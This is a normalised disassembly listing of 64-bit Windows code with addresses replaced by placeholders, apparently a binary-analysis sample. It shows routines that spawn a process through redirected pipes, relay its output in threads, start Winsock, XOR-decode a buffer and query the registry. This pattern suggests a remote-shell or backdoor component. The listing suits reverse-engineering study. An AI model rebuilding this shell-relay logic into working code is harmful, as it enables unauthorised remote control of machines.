lea rax [ r12 + rbp ]
lea rdx [ rdx + r12 * 2 ]
sub r8 r12
lea rcx [ rcx + rax * 2 ]
add r8 r8
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea r8 [ rbp + rbp ]
lea rcx [ rax + r12 * 2 ]
mov rdx rsi
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
xor eax eax
mov [ rcx + rdi * 2 ] ax
sub_1800142d0
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x270 ]
sub rsp 0x370
mov [ rbp - 0x10 ] 0xfffffffffffffffe
mov [ rsp + 0x3b8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x260 ] rax
mov rbx r8
mov rdi rdx
mov rsi rcx
xor edx edx
lea r8d [ rdx + 0x68 ]
lea rcx [ rbp - 0x80 ]
call sub_180021150
xor r11d r11d
mov [ rsp + 0x60 ] r11
mov [ rsp + 0x68 ] r11
mov [ rsp + 0x70 ] r11
mov [ rbp - 0x80 ] 0x68
xor r13d r13d
mov [ rbp - 0x78 ] r13
mov [ rbp - 0x68 ] r13
mov [ rbp - 0x70 ] r13
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x60 ] r13
mov [ rbp - 0x38 ] r13
mov [ rbp - 0x44 ] 0x101
mov [ rbp - 0x30 ] rdi
mov [ rbp - 0x28 ] rbx
call [ GetCurrentProcess@IAT ]
mov rdi rax
call [ GetCurrentProcess@IAT ]
mov rcx rax
mov [ rsp + 0x30 ] r13d
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] 0x2
lea r9 [ rbp - 0x20 ]
mov r8 rdi
mov rdx rbx
call [ DuplicateHandle@IAT ]
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx rsi
mov rcx [ rsi ]
jmp r-xdata
mov [ rbp + 0x50 ] r13b
xor edx edx
mov r8d 0x207
lea rcx [ rbp + 0x51 ]
call sub_180021150
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov rdi [ rsp + 0x60 ]
mov rcx [ rsi + 0x70 ]
mov [ rcx + 0x10 ] rdi
mov rcx [ rsi + 0x70 ]
mov [ rcx + 0x8 ] 0x1
mov rcx [ rsp + 0x68 ]
call [ CloseHandle@IAT ]
mov rax rdi
jmp r-xdata
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x48 ] rax
lea rax [ rbp - 0x80 ]
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] 0x1
xor r9d r9d
xor r8d r8d
xor edx edx
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
mov rdi r13
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
mov r8d 0x2c
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rdi rax
jmp r-xdata
mov rcx [ rbp + 0x260 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x3b8 ]
add rsp 0x370
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rsi
mov rcx [ rsi ]
jmp r-xdata
mov rdx [ rsi + 0x18 ]
cmp rdx 0x8
jb r-xdata
mov rdx rsi
mov rdx [ rsi ]
jmp r-xdata
mov rax [ rsi + 0x10 ]
lea r8 [ rcx + rax * 2 ]
cmp rdx 0x8
jb r-xdata
call [ GetLastError@IAT ]
mov r9d eax
mov r8 r12
mov rdx rbx
lea rcx [ rbp + 0x50 ]
call sub_180021724
cmp [ rbp + 0x38 ] 0x10
jb r-xdata
mov rbx [ rax ]
mov [ rbp + 0x10 ] 0xf
mov [ rbp + 0x8 ] r13
mov [ rbp - 0x8 ] 0x0
movzx r9d [ rsp + 0x50 ]
lea rcx [ rbp - 0x8 ]
call sub_18000de40
nop
lea rdx [ rbp + 0x20 ]
mov rcx rdi
call sub_180017d20
mov rbx rax
lea r12 [ rbp - 0x8 ]
cmp [ rbp + 0x10 ] 0x10
cmovae r12 [ rbp - 0x8 ]
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov [ rbp + 0x38 ] 0xf
mov [ rbp + 0x30 ] r13
mov [ rbp + 0x20 ] 0x0
cmp [ rbp + 0x10 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x20 ]
call j_sub_18002094c#2
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x8 ]
call j_sub_18002094c#2
mov ecx 0x28
call sub_180021000
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
je r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov rbx r13
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] r13
mov [ rax ] 0x0
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x50 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp + 0x50 ]
mov rcx rbx
call sub_180008110
jmp r-xdata
mov rcx [ rsi + 0x70 ]
mov rax [ rcx ]
mov rdx rbx
call [ rax + 0x8 ]
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
mov r8d 0x3
lea rdx [ rsp + 0x58 ]
lea rcx [ rbp - 0x8 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x8 ]
call sub_1800210a4
int3
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
mov r8d 0x7
lea rdx [ rsp + 0x58 ]
lea rcx [ rbp - 0x8 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x8 ]
call sub_1800210a4
int3
cmp [ rsi + 0x70 ] 0x0
jne r-xdata
sub_180014620
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0x90
mov [ rbp - 0x1 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
mov r14 rcx
mov [ rbp + 0x1f ] 0xf
xor edi edi
mov [ rbp + 0x17 ] rdi
mov [ rbp + 0x7 ] dil
mov r15 [ rcx + 0x48 ]
xor r12b r12b
call [ GetLastError@IAT ]
cmp eax 0x6d
je r-xdata
mov ebx [ rbp - 0x25 ]
test ebx ebx
je r-xdata
xor ecx ecx
call [ ExitThread@IAT ]
lea rax [ r--data ]
mov [ rbp - 0x21 ] rax
mov r8d 0x8
lea rdx [ rbp - 0x21 ]
lea rcx [ rbp - 0x19 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_1800210a4
int3
mov ecx 0x32
call [ Sleep@IAT ]
jmp r-xdata
lea rcx [ rbx + 0x4 ]
mov edx 0x1
call sub_180021308
mov r13 rax
test rax rax
je r-xdata
mov [ rsp + 0x28 ] rdi
lea rax [ rbp - 0x25 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx r15
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov [ rsp + 0x20 ] rdi
lea r9 [ rbp - 0x29 ]
mov r8d ebx
mov rdx rax
mov rcx r15
call [ ReadFile@IAT ]
xor esi esi
cmp [ rbp - 0x29 ] esi
jbe r-xdata
mov rcx r13
call sub_18002094c
mov ecx 0x28
call sub_180021000
mov rbx rax
mov [ rbp - 0x21 ] rax
xor edi edi
test rax rax
je r-xdata
mov rdi r13
mov rbx rdi
mov [ rax + 0x18 ] 0xf
mov [ rax + 0x10 ] rdi
mov [ rax ] dil
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x7 ]
mov rcx rax
call sub_180008000
jmp r-xdata
movzx eax [ rdi ]
cmp al 0x3c
jne r-xdata
cmp r12b 0xd
je r-xdata
lea rax [ r--data ]
mov [ rbp - 0x21 ] rax
mov r8d 0x7
lea rdx [ rbp - 0x21 ]
lea rcx [ rbp - 0x19 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_1800210a4
int3
mov rcx [ r14 + 0x70 ]
mov rax [ rcx ]
mov rdx rbx
call [ rax + 0x8 ]
mov [ rbp + 0x17 ] rdi
lea rax [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rax [ rbp + 0x7 ]
mov [ rax ] 0x0
jmp r-xdata
cmp [ r14 + 0x70 ] 0x0
je r-xdata
cmp al 0x3e
jne r-xdata
mov r8d 0x3
lea rdx [ r--data ]
lea rcx [ rbp + 0x7 ]
call sub_18000d060
jmp r-xdata
or rax 0xffffffffffffffff
mov r8 [ rbp + 0x17 ]
sub rax r8
cmp rax 0x1
jbe r-xdata
movzx r12d al
or rax 0xffffffffffffffff
mov r8 [ rbp + 0x17 ]
sub rax r8
cmp rax 0x1
jbe r-xdata
mov r8d 0x3
lea rdx [ r--data ]
lea rcx [ rbp + 0x7 ]
call sub_18000d060
jmp r-xdata
inc esi
inc rdi
cmp esi [ rbp - 0x29 ]
jb r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
lea rbx [ r8 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
lea rbx [ r8 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
cmp [ rdi ] 0xa
jne r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
cmp [ rbp + 0x1f ] rbx
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
cmp [ rbp + 0x1f ] rbx
jae r-xdata
test rbx rbx
jne r-xdata
mov rdx rbx
lea rcx [ rbp + 0x7 ]
call sub_180007580
jmp r-xdata
test rbx rbx
jne r-xdata
mov rdx rbx
lea rcx [ rbp + 0x7 ]
call sub_180007580
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp + 0x17 ] rbx
lea rax [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rax [ rbp + 0x7 ]
mov [ rax ] bl
test rbx rbx
setne al
test al al
je r-xdata
mov [ rbp + 0x17 ] rbx
lea rax [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rax [ rbp + 0x7 ]
mov [ rax ] bl
test rbx rbx
lea rcx [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rcx [ rbp + 0x7 ]
mov rax [ rbp + 0x17 ]
mov [ rcx + rax ] 0xd
mov [ rbp + 0x17 ] rbx
lea rax [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rax [ rbp + 0x7 ]
mov [ rax + rbx ] 0x0
lea rcx [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rcx [ rbp + 0x7 ]
mov rax [ rbp + 0x17 ]
mov [ rcx + rax ] r12b
mov [ rbp + 0x17 ] rbx
lea rax [ rbp + 0x7 ]
cmp [ rbp + 0x1f ] 0x10
cmovae rax [ rbp + 0x7 ]
mov [ rax + rbx ] 0x0
sub_180014980
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
or rcx 0xffffffffffffffff
mov rdi rdx
mov r10 r8
xor eax eax
mov r8 rdx
[ rdi ]
xor esi esi
xor edx edx
not rcx
mov [ rsp + 0x30 ] esi
lea r9 [ rcx - 0x1 ]
mov rcx r10
call sub_180014120
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov rcx rbx
mov rdx rax
mov [ rbx ] si
call sub_180003cb0
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_1800149f0
mov rax rsp
push rbp
lea rbp [ rax - 0x438 ]
sub rsp 0x530
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x420 ] rax
mov rbx rcx
mov [ rsp + 0x20 ] rcx
mov [ rcx + 0x18 ] 0x7
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea ecx [ rsi + 0x30 ]
call sub_180021000
mov [ rsp + 0x28 ] rax
test rax rax
je r-xdata
mov rdi rsi
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
mov [ rbp ] si
xor edx edx
mov r8d 0x206
lea rcx [ rbp + 0x2 ]
call sub_180021150
lea rcx [ rsp + 0x38 ]
cmp [ rsp + 0x50 ] 0x8
cmovae rcx [ rsp + 0x38 ]
mov r8d 0x104
lea rdx [ rbp ]
call [ GetEnvironmentVariableW@IAT ]
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp ]
mov rcx rbx
call sub_180003930
lea rdx [ rbp - 0x78 ]
cmp [ rbp - 0x60 ] 0x8
cmovae rdx [ rbp - 0x78 ]
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r9 [ rcx - 0x1 ]
xor r8d r8d
mov rcx rbx
call sub_180013ec0
cmp rax 0xffffffffffffffff
jne r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp - 0x78 ]
mov rcx rdi
call sub_180017bc0
nop
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rsp + 0x38 ]
mov rcx rdi
call sub_180017bc0
nop
test rdi rdi
je r-xdata
mov [ rbx + 0x28 ] rsi
mov [ rbx + 0x30 ] rsi
mov [ rbx + 0x38 ] rsi
mov [ rbx + 0x40 ] rsi
mov [ rbx + 0x48 ] rsi
mov [ rbx + 0x50 ] esi
mov [ rbx + 0x58 ] rsi
mov [ rbx + 0x68 ] esi
mov [ rbx + 0x60 ] rsi
mov [ rbx + 0x70 ] rsi
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov [ rbp + 0x210 ] si
xor edx edx
mov r8d 0x206
lea rcx [ rbp + 0x212 ]
call sub_180021150
mov edx 0x104
lea rcx [ rbp + 0x210 ]
call [ GetSystemDirectoryW@IAT ]
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x60 ] si
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
call sub_180003930
nop
lea r8 [ rsp + 0x60 ]
lea rdx [ rbp + 0x210 ]
lea rcx [ rbp - 0x50 ]
call sub_180014980
nop
lea r8 [ rbp - 0x78 ]
mov rdx rax
lea rcx [ rbp - 0x28 ]
call sub_180008960
nop
mov rdx rax
mov rcx rbx
call sub_180003cb0
nop
cmp [ rbp - 0x10 ] 0x8
jb r-xdata
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x38 ] si
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
mov [ rbp - 0x10 ] 0x7
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x28 ] si
cmp [ rbp - 0x38 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_18002094c#2
mov rax rbx
mov rcx [ rbp + 0x420 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x530 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x78 ]
call j_sub_18002094c#2
nop
jmp r-xdata
mov [ rbp - 0x38 ] 0x7
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x50 ] si
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x50 ]
call j_sub_18002094c#2
mov rcx [ rsp + 0x60 ]
call j_sub_18002094c#2
sub_180014cd0
mov rax rsp
push rbp
push rdi
push r12
push r13
push r14
mov rbp rsp
sub rsp 0x80
mov [ rbp - 0x50 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rbx rcx
xor eax eax
mov [ rbp - 0x48 ] rax
mov [ rbp - 0x40 ] rax
mov [ rbp - 0x38 ] rax
mov [ rbp - 0x48 ] 0x18
xor edi edi
mov [ rbp - 0x40 ] rdi
mov [ rbp - 0x38 ] 0x1
xor r9d r9d
lea r8 [ rbp - 0x48 ]
lea rdx [ rcx + 0x30 ]
add rcx 0x38
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
xor r9d r9d
lea r8 [ rbp - 0x48 ]
lea rdx [ rbx + 0x40 ]
lea rcx [ rbx + 0x48 ]
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
lea r8d [ rdi + 0x1 ]
lea rdx [ rbp + 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_1800210a4
int3
mov r8 [ rbx + 0x40 ]
mov rdx [ rbx + 0x38 ]
mov rcx rbx
call sub_1800142d0
mov [ rbx + 0x28 ] rax
lea rax [ rbx + 0x50 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edi
mov r9 rbx
lea r8 [ sub_180014030 ]
xor edx edx
lea rcx [ rbp - 0x48 ]
call [ CreateThread@IAT ]
mov [ rbx + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
mov r8d 0x2
lea rdx [ rbp + 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_1800210a4
int3
lea rax [ rbx + 0x68 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] edi
mov r9 rbx
lea r8 [ sub_180014620 ]
xor edx edx
lea rcx [ rbp - 0x48 ]
call [ CreateThread@IAT ]
mov r11 rax
mov [ rbx + 0x60 ] rax
test rax rax
jne r-xdata
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
mov r8d 0x4
lea rdx [ rbp + 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_1800210a4
int3
mov rax [ rbx + 0x58 ]
mov [ rbp - 0x30 ] rax
mov [ rbp - 0x28 ] r11
mov rax [ rbx + 0x28 ]
mov [ rbp - 0x20 ] rax
or r9d 0xffffffff
xor r8d r8d
lea rdx [ rbp - 0x30 ]
lea ecx [ r8 + 0x3 ]
call [ WaitForMultipleObjects@IAT ]
mov rcx [ rbx + 0x70 ]
mov [ rcx + 0x8 ] dil
mov [ rbp + 0x30 ] 0x1
test eax eax
je r-xdata
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
lea r8d [ r11 + 0x5 ]
lea rdx [ rbp + 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_180020370
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_1800210a4
int3
mov ecx 0x30
call sub_180021000
mov [ rbp + 0x38 ] rax
test rax rax
je r-xdata
dec eax
je r-xdata
mov rsi rdi
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
mov r8d 0x31
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rsi rax
jmp r-xdata
mov ecx 0x30
call sub_180021000
mov [ rbp + 0x38 ] rax
test rax rax
je r-xdata
dec eax
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180013e70
test rsi rsi
je r-xdata
mov rdx rax
mov rcx rsi
call sub_180017d20
mov rdi rax
mov ecx 0x28
call sub_180021000
mov [ rbp + 0x38 ] rax
test rax rax
je r-xdata
mov rsi rdi
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
mov r8d 0x31
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rsi rax
jmp r-xdata
mov rcx [ rbx + 0x30 ]
call [ DisconnectNamedPipe@IAT ]
mov rcx [ rbx + 0x30 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x48 ]
call [ DisconnectNamedPipe@IAT ]
mov rcx [ rbx + 0x48 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x58 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x60 ]
call [ CloseHandle@IAT ]
mov rcx [ rbx + 0x28 ]
call [ CloseHandle@IAT ]
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rbp
retn
lea ecx [ rax + 0x30 ]
call sub_180021000
mov [ rbp + 0x38 ] rax
test rax rax
je r-xdata
lea rdx [ rbp + 0x30 ]
mov rcx [ rbx + 0x60 ]
call [ GetExitCodeThread@IAT ]
mov rcx [ rbx + 0x60 ]
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
mov rdx rdi
mov rcx rbx
call sub_180013e70
test rsi rsi
je r-xdata
mov rdx rax
mov rcx rsi
call sub_180017d20
mov rdi rax
mov ecx 0x28
call sub_180021000
mov [ rbp + 0x38 ] rax
test rax rax
je r-xdata
mov rsi rdi
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
mov r8d 0x19
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rsi rax
jmp r-xdata
lea rdx [ rbp + 0x30 ]
mov rcx [ rbx + 0x58 ]
call [ GetExitCodeThread@IAT ]
mov rcx [ rbx + 0x58 ]
jmp r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
mov rdx rdi
mov rcx rbx
call sub_180013e70
test rsi rsi
je r-xdata
mov rdx rax
mov rcx rsi
call sub_180017d20
mov rdi rax
mov ecx 0x28
call sub_180021000
mov [ rbp + 0x38 ] rax
test rax rax
je r-xdata
mov edx [ rbp + 0x30 ]
call [ TerminateThread@IAT ]
lea rdx [ rbp + 0x30 ]
mov rcx [ rbx + 0x28 ]
call [ GetExitCodeProcess@IAT ]
mov edx [ rbp + 0x30 ]
mov rcx [ rbx + 0x28 ]
call [ TerminateProcess@IAT ]
lea rdx [ rbp + 0x30 ]
mov rcx [ rbx + 0x60 ]
call [ GetExitCodeThread@IAT ]
mov edx [ rbp + 0x30 ]
mov rcx [ rbx + 0x60 ]
call [ TerminateThread@IAT ]
lea rdx [ rbp + 0x30 ]
mov rcx [ rbx + 0x58 ]
call [ GetExitCodeThread@IAT ]
mov edx [ rbp + 0x30 ]
mov rcx [ rbx + 0x58 ]
call [ TerminateThread@IAT ]
jmp r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
sub_180015130
push r12
sub rsp 0x40
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rbp
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov r12 r9
mov ebx r8d
mov rbp rdx
xor esi esi
mov [ rsp + 0x20 ] rsi
lea ecx [ rsi + 0x30 ]
call sub_180021000
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rdi rsi
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
test rbx rbx
je r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov r8 rbx
lea r9 [ rsp + 0x20 ]
mov rdx rbp
mov rcx rdi
call sub_180017a70
mov rbx rax
test rdi rdi
je r-xdata
xor eax eax
cmp [ rsp + 0x20 ] 0x4
jb r-xdata
lea rcx [ rbx + 0x4 ]
mov r9 0xfffffffffffffffc
sub r9 rbx
mov r8d 0xb
nop [ rax ] eax
lea rax [ r9 + rcx ]
and eax 0x3
movzx eax [ rax + rbx ]
xor [ rcx ] al
inc rcx
dec r8
jne r-xdata
lea rax [ rw-data ]
mov ecx [ rax ]
cmp ecx [ rbx + 0x4 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov esi eax
movzx ecx [ rax + 0x4 ]
cmp cx [ rbx + 0x8 ]
jne r-xdata
mov eax [ rsp + 0x20 ]
add eax 0xfffffff5
mov [ r12 ] eax
mov edi eax
lea edx [ rsi + 0x1 ]
mov ecx eax
call sub_180021308
mov rsi rax
test rax rax
je r-xdata
movzx ecx [ rax + 0x6 ]
cmp cl [ rbx + 0xa ]
je r-xdata
lea r8 [ rbx + 0xb ]
mov r9d edi
mov edx edi
mov rcx rax
call sub_18002134c
mov rcx rbx
call sub_18002094c
mov rax rsi
jmp r-xdata
test esi esi
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_180015280
push rdi
sub rsp 0x1e0
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x1f8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1d0 ] rax
mov rdi rcx
mov ecx 0x202
lea rdx [ rsp + 0x30 ]
call WSAStartup
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov rcx rax
call sub_180017520
mov rbx rax
jmp r-xdata
mov dl 0x1
mov rcx rbx
call sub_180017680
lea rcx [ rdi + 0x6d ]
mov r9d 0x40
mov r8 [ rbx + 0x28 ]
mov edx r9d
call sub_18002134c
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
mov al 0x1
mov rcx [ rsp + 0x1d0 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x1f8 ]
add rsp 0x1e0
pop rdi
retn
sub_180015360
mov [ rsp + 0x8 ] rbx
cmp [ rdx + 0x18 ] 0x8
mov r11 [ rdx + 0x10 ]
jb r-xdata
mov r9 [ rcx + 0x10 ]
cmp r9 r9
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rdx [ rdx ]
cmp r9 r11
mov r8 r11
cmovb r8 r9
xor r10d r10d
or ebx 0xffffffff
test r8 r8
je r-xdata
mov rcx [ rcx ]
mov r8d r10d
nop [ rax ] eax
mov rbx [ rsp + 0x8 ]
retn
cmp r9 r11
jae r-xdata
cmp [ rcx ] ax
mov r8d 0x1
cmovb r8d ebx
jmp r-xdata
add rcx 0x2
add rdx 0x2
dec r8
jne r-xdata
setne r10b
mov eax r10d
mov eax ebx
mov rbx [ rsp + 0x8 ]
retn
movsxd rax r8d
test r8d r8d
jne r-xdata
movzx eax [ rdx ]
cmp [ rcx ] ax
jne r-xdata
sub_1800153f0
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xb0
mov [ rbp - 0x11 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4f ] rax
mov ecx 0x30
call sub_180021000
mov [ rbp - 0x9 ] rax
xor edi edi
test rax rax
je r-xdata
mov rbx rdi
mov rcx rax
call sub_180017520
mov rbx rax
jmp r-xdata
mov [ rbp - 0x29 ] edi
mov [ rbp - 0x19 ] 0x4
mov r8d 0x24
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x1 ]
mov rcx rbx
call sub_180017bc0
nop
test rbx rbx
je r-xdata
cmp [ rbp + 0x3f ] 0x8
jb r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800175a0
mov r8d 0x78
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp + 0x27 ]
mov rcx rbx
call sub_180017bc0
nop
mov [ rbp - 0x21 ] rdi
lea rdx [ rbp + 0x27 ]
cmp [ rbp + 0x3f ] 0x8
cmovae rdx [ rbp + 0x27 ]
lea rax [ rbp - 0x21 ]
mov [ rsp + 0x20 ] rax
mov r9d 0xf003f
xor r8d r8d
mov rcx 0xffffffff80000001
call [ RegOpenKeyExW@IAT ]
cmp eax 0x2
jne r-xdata
lea rdx [ rbp - 0x1 ]
cmp [ rbp + 0x17 ] 0x8
cmovae rdx [ rbp - 0x1 ]
lea rax [ rbp - 0x19 ]
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x29 ]
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor r8d r8d
mov rcx [ rbp - 0x21 ]
call [ RegQueryValueExW@IAT ]
mov rcx [ rbp - 0x21 ]
test eax eax
je r-xdata
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
xor al al
jmp r-xdata
mov rcx [ rbp + 0x27 ]
call j_sub_18002094c#2
cmp [ rbp - 0x29 ] 0x0
jne r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4f ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xb0 ]
mov rbx [ r11 + 0x10 ]
mov rdi [ r11 + 0x18 ]
mov rsp r11
pop rbp
retn
mov [ rbp - 0x29 ] edi
lea rdx [ rbp - 0x1 ]
cmp [ rbp + 0x17 ] 0x8
cmovae rdx [ rbp - 0x1 ]
mov [ rsp + 0x28 ] 0x4
